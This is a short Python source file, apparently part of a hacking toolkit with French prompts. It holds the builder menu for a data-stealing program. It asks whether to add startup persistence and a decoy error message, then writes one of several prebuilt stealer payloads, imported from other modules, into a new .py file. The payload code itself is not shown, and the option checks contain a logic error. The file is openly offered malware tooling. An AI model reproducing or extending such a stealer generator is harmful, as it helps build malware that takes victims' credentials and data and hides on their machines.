from util import utils
from util.program import *
import os
import util
import util.stealer
import util.stealer.code
import util.stealer.code.stealer
import util.stealer.code.stealernoerr
import util.stealer.code.stealernostartup
import util.stealer.code.stealerwithnothing
import util.stealer.code.stealer

async def stealer():
    os.system('cls')
    print(utils.red + utils.stealer_banner)

    directory = r'util\stealer' 

    option1 = input('STARTUP [Y/N]: ')
    option2 = input('ERROR MESSAGE [Y/N]: ')
    filename = os.path.join(directory, input('\nNOM DU FICHIER : ') + ".py")
    
    if option1 and option2 == 'Y':
        with open(filename, "w") as file:
            file.write(f"{util.stealer.code.stealer.stealer_code}")

    elif option1 == 'N' and option2 == 'Y':
        with open(filename, "w") as file:
            file.write(f"{util.stealer.code.stealernostartup.stealer_code_no_startup}")

    elif option2 == 'N' and option1 == 'Y':
        with open(filename, "w") as file:
            file.write(f"{util.stealer.code.stealernoerr.stealer_no_err}")

    elif option1 and option2 == 'N':
        with open(filename, "w") as file:
            file.write(f"{util.stealer.code.stealerwithnothing.stealer_src}")

    else:
        pass
    

    print(f"{utils.red}\nFINISH ! ")